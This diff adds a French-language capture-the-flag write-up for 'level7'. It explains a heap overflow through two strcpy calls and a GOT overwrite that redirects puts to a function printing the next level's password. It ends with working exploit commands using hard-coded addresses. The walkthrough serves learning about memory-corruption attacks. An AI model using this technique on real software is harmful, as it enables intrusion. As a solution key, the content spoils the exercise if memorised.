@@ -1,0 +1,46 @@
+le main fait 4 malloc d'affilé puis 2 strcpy, ensuite il y a un fopen qui stock le resultat du retour de level8/.pass dans la variable 'c'.
+cette meme variable est lue dans le printf de la fonction m.
+un peu a la maniere de l'exercice 5 ou nous avons modifié l'adresse du exit pour qu'il pointe sur la fonction affichant le flag nous allons cette fois modifier l'adresse de puts pour qu'il pointe sur la fonction 'm' qui affiche le flag.
+
+le premier malloc est de 8
+    header1        espcae1
+   |_|_|_|_| |_|_|_|_|_|_|_|_|
+le deuxieme est de 8 a partir de la la var A + 4(voir pseudo code)
+    header1    espcae1   header2       espace2
+   |_|_|_|_| |_|_|_|_| |_|_|_|_| |_|_|_|_|_|_|_|_|
+
+ce qui donne un bloc de 16 d'affilé
+juste apres l'espace2 viendra le header du 3eme malloc et son espace alloué...
+
+3eme malloc
+    header1    espcae1   header2       espace2      header3      espace3
+   |_|_|_|_| |_|_|_|_| |_|_|_|_| |_|_|_|_|_|_|_|_| |_|_|_|_| |_|_|_|_|_|_|_|_|
+
+
+
+si nous ne mettons qu'un seul argument, pendant le strcpy nous pouvons voir qu'au dela de 20 caracteres ca nous permet de remplir l'espace autoriser puis d'ecraser le header2 et de remplir egalement l'espace2 dans la heap.
+pour ecraser le header du 3 eme malloc et rediriger ou l'on veux l'adresse pointée par le malloc 3 nous allons entrer l'adresse souhaitée.
+on vas donc entrer l'adresse de puts pour que la variable que j'ai appellé B pointe dorenavant sur puts
+pour cela,
+
+    gdb level7
+    disas main
+           ...
+           0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+           ...
+
+    disas 0x8048400
+           0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
+           ...
+
+adresse puts 0x8049928
+
+en deuxieme argument on va profiter du deuxieme strcpy afin d'entrer la valeur de l'adresse de la fonction 'm'
+
+la commande final
+
+./level7 "`/bin/echo -ne "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"`" "`/bin/echo -ne "\xf4\x84\x04\x08"`"
+
+option n pour ne pas ajouter de \n et le e pour interpreter les caractere precede de \ comme tel
+ou bien
+./level7 `python -c 'print "B" * 20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'
